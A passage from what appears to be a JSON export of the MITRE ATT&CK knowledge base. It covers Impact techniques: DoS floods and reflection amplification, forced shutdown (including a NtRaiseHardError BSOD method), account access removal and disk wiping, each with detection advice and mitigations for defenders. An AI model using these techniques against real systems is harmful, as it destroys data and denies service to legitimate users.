remediation.","platforms":["Windows","IaaS","Linux","macOS"],"dataSources":["Network Traffic: Network Traffic Flow","Sensor Health: Host Status"],"mitigations":[{"id":"M1037","name":"Filter Network Traffic","description":"When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations. <a href=\"http://cert.europa.eu/static/WhitePapers/CERT-EU_Security_Whitepaper_DDoS_17-003.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CERT-EU DDoS March 2017)</a>\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. <a href=\"http://cert.europa.eu/static/WhitePapers/CERT-EU_Security_Whitepaper_DDoS_17-003.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CERT-EU DDoS March 2017)</a>\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents. <a href=\"http://cert.europa.eu/static/WhitePapers/CERT-EU_Security_Whitepaper_DDoS_17-003.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CERT-EU DDoS March 2017)</a>"}]},{"id":"T1498.002","name":"Reflection Amplification","description":"Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target. <a href=\"https://blog.cloudflare.com/reflections-on-reflections/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cloudflare ReflectionDoS May 2017)</a> This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.\n\nReflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS <a href=\"https://www.cloudflare.com/learning/ddos/dns-amplification-ddos-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cloudflare DNSamplficationDoS)</a> and NTP <a href=\"https://www.cloudflare.com/learning/ddos/ntp-amplification-ddos-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cloudflare NTPamplifciationDoS)</a>, though the use of several others in the wild have been documented. <a href=\"https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Arbor AnnualDoSreport Jan 2018)</a>  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet. <a href=\"https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cloudflare Memcrashed Feb 2018)</a>","detection":"Detection of reflection amplification can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow <a href=\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco DoSdetectNetflow)</a>, SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect a reflection amplification DoS event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation.","platforms":["Windows","IaaS","Linux","macOS"],"dataSources":["Sensor Health: Host Status","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1037","name":"Filter Network Traffic","description":"When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations. <a href=\"http://cert.europa.eu/static/WhitePapers/CERT-EU_Security_Whitepaper_DDoS_17-003.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CERT-EU DDoS March 2017)</a>\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. <a href=\"http://cert.europa.eu/static/WhitePapers/CERT-EU_Security_Whitepaper_DDoS_17-003.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CERT-EU DDoS March 2017)</a>\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents. <a href=\"http://cert.europa.eu/static/WhitePapers/CERT-EU_Security_Whitepaper_DDoS_17-003.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CERT-EU DDoS March 2017)</a>"}]}]},{"id":"T1499","name":"Endpoint Denial of Service","description":"Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes <a href=\"https://www.fireeye.com/blog/threat-research/2014/11/operation-poisoned-handover-unveiling-ties-between-apt-activity-in-hong-kongs-pro-democracy-movement.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye OpPoisonedHandover February 2016)</a> and to support other malicious activities, including distraction <a href=\"https://www.ic3.gov/Media/PDF/Y2012/FraudAlertFinancialInstitutionEmployeeCredentialsTargeted.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FSISAC FraudNetDoS September 2012)</a>, hacktivism, and extortion. <a href=\"https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-continued-rise-of-ddos-attacks.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec DDoS October 2014)</a>\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks. <a href=\"https://www.justice.gov/opa/pr/seven-iranians-working-islamic-revolutionary-guard-corps-affiliated-entities-charged\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: USNYAG IranianBotnet March 2016)</a>\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers. <a href=\"https://arstechnica.com/information-technology/2015/03/massive-denial-of-service-attack-on-github-tied-to-chinese-government/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ArsTechnica Great Firewall of China)</a>\n\nFor attacks attempting to saturate the providing network, see Network Denial of Service.","detection":"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization. <a href=\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco DoSdetectNetflow)</a> Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.\n\nIn addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.\n\nExternally monitor the availability of services that may be targeted by an Endpoint DoS.","platforms":["Windows","Linux","macOS","Containers","IaaS"],"dataSources":["Application Log: Application Log Content","Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content","Sensor Health: Host Status"],"mitigations":[{"id":"M1037","name":"Filter Network Traffic","description":"Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. <a href=\"http://cert.europa.eu/static/WhitePapers/CERT-EU_Security_Whitepaper_DDoS_17-003.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CERT-EU DDoS March 2017)</a> Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."}],"subTechniques":[{"id":"T1499.001","name":"OS Exhaustion Flood","description":"Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods. <a href=\"https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Arbor AnnualDoSreport Jan 2018)</a> With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server. <a href=\"https://www.cloudflare.com/learning/ddos/syn-flood-ddos-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cloudflare SynFlood)</a>\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service. <a href=\"https://www.corero.com/resources/ddos-attack-types/syn-flood-ack.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Corero SYN-ACKflood)</a>","detection":"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization. <a href=\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco DoSdetectNetflow)</a> Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.","platforms":["Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content","Sensor Health: Host Status"],"mitigations":[{"id":"M1037","name":"Filter Network Traffic","description":"Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. <a href=\"http://cert.europa.eu/static/WhitePapers/CERT-EU_Security_Whitepaper_DDoS_17-003.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CERT-EU DDoS March 2017)</a> Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."}]},{"id":"T1499.002","name":"Service Exhaustion Flood","description":"Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well. <a href=\"https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Arbor AnnualDoSreport Jan 2018)</a> Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.\n\nOne example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service. <a href=\"https://www.cloudflare.com/learning/ddos/http-flood-ddos-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cloudflare HTTPflood)</a>\n\nAnother variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume. <a href=\"https://www.netscout.com/blog/asert/ddos-attacks-ssl-something-old-something-new\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Arbor SSLDoS April 2012)</a>","detection":"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization. <a href=\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco DoSdetectNetflow)</a> Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.\n\nIn addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.\n\nExternally monitor the availability of services that may be targeted by an Endpoint DoS.","platforms":["Windows","IaaS","Linux","macOS"],"dataSources":["Application Log: Application Log Content","Sensor Health: Host Status","Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1037","name":"Filter Network Traffic","description":"Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. <a href=\"http://cert.europa.eu/static/WhitePapers/CERT-EU_Security_Whitepaper_DDoS_17-003.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CERT-EU DDoS March 2017)</a> Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport."}]},{"id":"T1499.003","name":"Application Exhaustion Flood","description":"Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself. <a href=\"https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Arbor AnnualDoSreport Jan 2018)</a>","detection":"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization. <a href=\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco DoSdetectNetflow)</a> Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.\n\nIn addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.","platforms":["Windows","IaaS","Linux","macOS"],"dataSources":["Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content","Sensor Health: Host Status","Application Log: Application Log Content"],"mitigations":[{"id":"M1037","name":"Filter Network Traffic","description":"Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. <a href=\"http://cert.europa.eu/static/WhitePapers/CERT-EU_Security_Whitepaper_DDoS_17-003.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CERT-EU DDoS March 2017)</a> Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport."}]},{"id":"T1499.004","name":"Application or System Exploitation","description":"Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. <a href=\"https://blog.sucuri.net/2015/08/bind9-denial-of-service-exploit-in-the-wild.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sucuri BIND9 August 2015)</a> Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as Data Destruction, Firmware Corruption, Service Stop etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems.","detection":"Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack. Externally monitor the availability of services that may be targeted by an Endpoint DoS.","platforms":["Windows","IaaS","Linux","macOS"],"dataSources":["Application Log: Application Log Content","Sensor Health: Host Status","Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1037","name":"Filter Network Traffic","description":"Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. <a href=\"http://cert.europa.eu/static/WhitePapers/CERT-EU_Security_Whitepaper_DDoS_17-003.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CERT-EU DDoS March 2017)</a> Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport."}]}]},{"id":"T1529","name":"System Shutdown/Reboot","description":"Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via Network Device CLI (e.g. <code>reload</code>). <a href=\"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/shutdown\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Shutdown Oct 2017)</a> <a href=\"https://www.cisa.gov/uscert/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: alert_TA18_106A)</a> They may also include shutdown/reboot of a virtual machine via hypervisor / cloud consoles or command line tools.\n\nShutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.\n\nAdversaries may also use Windows API functions, such as <code>InitializeSystemShutdownExW</code> or <code>ExitWindowsEx</code>, to force a system to shut down or reboot. <a href=\"https://www.crowdstrike.com/en-us/blog/how-crowdstrike-falcon-protects-against-wiper-malware-used-in-ukraine-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CrowdStrike Blog)</a> <a href=\"https://unit42.paloaltonetworks.com/agonizing-serpens-targets-israeli-tech-higher-ed-sectors/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit42 Agrius 2023)</a> Alternatively, the <code>NtRaiseHardError</code>or <code>ZwRaiseHardError</code> Windows API functions with the <code>ResponseOption</code> parameter set to <code>OptionShutdownSystem</code> may deliver a “blue screen of death” (BSOD) to a system. <a href=\"https://www.sonicwall.com/blog/disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SonicWall)</a> <a href=\"https://ntdoc.m417z.com/ntraiseharderror\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NtRaiseHardError)</a> <a href=\"https://github.com/lzcapp/NotMe-BSOD\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NotMe-BSOD)</a> In order to leverage these API functions, an adversary may need to acquire <code>SeShutdownPrivilege</code> (e.g., via Access Token Manipulation). <a href=\"https://unit42.paloaltonetworks.com/agonizing-serpens-targets-israeli-tech-higher-ed-sectors/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit42 Agrius 2023)</a>\n In some cases, the system may not be able to boot again. \n\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as Disk Structure Wipe or Inhibit System Recovery, to hasten the intended effects on system availability. <a href=\"https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos Nyetya June 2017)</a> <a href=\"https://blog.talosintelligence.com/2018/02/olympic-destroyer.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos Olympic Destroyer 2018)</a>","detection":"Use process monitoring to monitor the execution and command line parameters of binaries involved in shutting down or rebooting systems. Windows event logs may also designate activity associated with a shutdown/reboot, ex. Event ID 1074 and 6006. Unexpected or unauthorized commands from network cli on network devices may also be associated with shutdown/reboot, e.g. the <code>reload</code> command.","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Process: Process Creation","Sensor Health: Host Status","Command: Command Execution"],"mitigations":[],"subTechniques":[]},{"id":"T1531","name":"Account Access Removal","description":"Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials, revoked permissions for SaaS platforms such as Sharepoint) to remove access to accounts. <a href=\"https://web.archive.org/web/20230608061141/https://www.obsidiansecurity.com/blog/saas-ransomware-observed-sharepoint-microsoft-365/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Obsidian Security SaaS Ransomware June 2023)</a> Adversaries may also subsequently log off and/or perform a System Shutdown/Reboot to set malicious changes into place. <a href=\"https://www.carbonblack.com/2019/03/22/tau-threat-intelligence-notification-lockergoga-ransomware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CarbonBlack LockerGoga 2019)</a> <a href=\"https://unit42.paloaltonetworks.com/born-this-way-origins-of-lockergoga/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit42 LockerGoga 2019)</a>\n\nIn Windows, Net utility, <code>Set-LocalUser</code> and <code>Set-ADAccountPassword</code> PowerShell cmdlets may be used by adversaries to modify user accounts. Accounts could also be disabled by Group Policy. In Linux, the <code>passwd</code> utility may be used to change passwords. On ESXi servers, accounts can be removed or modified via esxcli (<code>system account set</code>, <code>system account remove</code>).\n\nAdversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such as Data Destruction and Defacement, in order to impede incident response/recovery before completing the Data Encrypted for Impact objective.","detection":"Use process monitoring to monitor the execution and command line parameters of binaries involved in deleting accounts or changing passwords, such as use of Net. Windows event logs may also designate activity associated with an adversary's attempt to remove access to an account:\n\n* Event ID 4723 - An attempt was made to change an account's password\n* Event ID 4724 - An attempt was made to reset an account's password\n* Event ID 4726 - A user account was deleted\n* Event ID 4740 - A user account was locked out\n\nAlerting on Net and these Event IDs may generate a high degree of false positives, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.","platforms":["Linux","macOS","Windows","SaaS","IaaS","Office Suite","ESXi"],"dataSources":["Active Directory: Active Directory Object Modification","User Account: User Account Modification","User Account: User Account Deletion"],"mitigations":[],"subTechniques":[]},{"id":"T1561","name":"Disk Wipe","description":"Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. <a href=\"https://web.archive.org/web/20160303200515/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Novetta Blockbuster Destructive Malware)</a>\n\nOn network devices, adversaries may wipe configuration files and other data from the device using Network Device CLI commands such as <code>erase</code>. <a href=\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/fundamentals/command/cf_command_ref/D_through_E.html#wp3557227463\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: erase_cmd_cisco)</a>","detection":"Look for attempts to read/write to sensitive locations like the partition boot sector, master boot record, disk partition table, or BIOS parameter block/superblock. Monitor for direct access read/write attempts using the <code>\\\\\\\\.\\\\</code> notation. <a href=\"https://docs.microsoft.com/sysinternals/downloads/sysmon\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Sysmon v6 May 2017)</a> Monitor for unusual kernel driver installation activity.","platforms":["Linux","macOS","Windows","Network Devices"],"dataSources":["Driver: Driver Load","Drive: Drive Access","Command: Command Execution","Drive: Drive Modification","Process: Process Creation"],"mitigations":[{"id":"M1053","name":"Data Backup","description":"Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. <a href=\"https://www.ready.gov/business/implementation/IT\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ready.gov IT DRP)</a> Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery."}],"subTechniques":[{"id":"T1561.001","name":"Disk Content Wipe","description":"Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.\n\nAdversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface. <a href=\"https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Novetta Blockbuster)</a> <a href=\"https://web.archive.org/web/20160303200515/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Novetta Blockbuster Destructive Malware)</a> <a href=\"https://www.justice.gov/opa/press-release/file/1092091/download\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DOJ Lazarus Sony 2018)</a> Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data. <a href=\"https://web.archive.org/web/20160303200515/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Novetta Blockbuster Destructive Malware)</a> Adversaries have also been observed leveraging third-party drivers like RawDisk to directly access disk content. <a href=\"https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Novetta Blockbuster)</a> <a href=\"https://web.archive.org/web/20160303200515/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Novetta Blockbuster Destructive Malware)</a> This behavior is distinct from Data Destruction because sections of the disk are erased instead of individual files.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. <a href=\"https://web.archive.org/web/20160303200515/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Novetta Blockbuster Destructive Malware)</a>","detection":"Look for attempts to read/write to sensitive locations like the partition boot sector or BIOS parameter block/superblock. Monitor for direct access read/write attempts using the <code>\\\\\\\\.\\\\</code> notation. <a href=\"https://docs.microsoft.com/sysinternals/downloads/sysmon\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Sysmon v6 May 2017)</a> Monitor for unusual kernel driver installation activity.\n\nFor network infrastructure devices, collect AAA logging to monitor for <code>erase</code> commands that delete critical configuration files.","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["Drive: 